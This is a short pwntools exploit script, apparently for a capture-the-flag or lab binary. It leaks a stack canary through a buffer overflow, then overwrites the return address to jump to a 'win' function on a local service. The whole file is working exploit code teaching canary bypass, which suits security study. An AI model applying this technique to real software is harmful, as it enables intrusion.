#!/usr/bin/env python3
from pwn import *

bin_file = './sbof_leak_w_ssp'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

binf = ELF(bin_file)
addr_win = binf.functions['win'].address

def attack(conn, **kwargs):
	
	#conn.sendafter('>> ', b'a'*0x18+b'!')
	ropch = b''
	ropch += b'a'*0x18
	ropch += b'!'
	info( conn.sendafter(b'>>', ropch).decode() )
	
	#conn.recvuntil('a!', timeout=5)
	info( conn.recvuntil('a!', timeout=5).decode() )
	
	canary = u64(b'\x00' + conn.recv(7))
	
	info('canary = 0x{:08x}'.format(canary))
    
	exploit  = b'a'*0x18
	exploit += p64(canary)
	exploit += p64(0xdeadbeef)
	exploit += p64(addr_win)
	#conn.sendafter('>> ', exploit)
	
	info( conn.sendlineafter(b'>>', exploit).decode() )
	info( conn.recvall(timeout=5).decode() )

def main():
	adrs = "localhost"
	port = 4000
	proc = remote(adrs, port)
	attack(proc)
	
	#conn = process(bin_file)
	#attack(conn)
	#conn.interactive()

if __name__=='__main__':
	main()
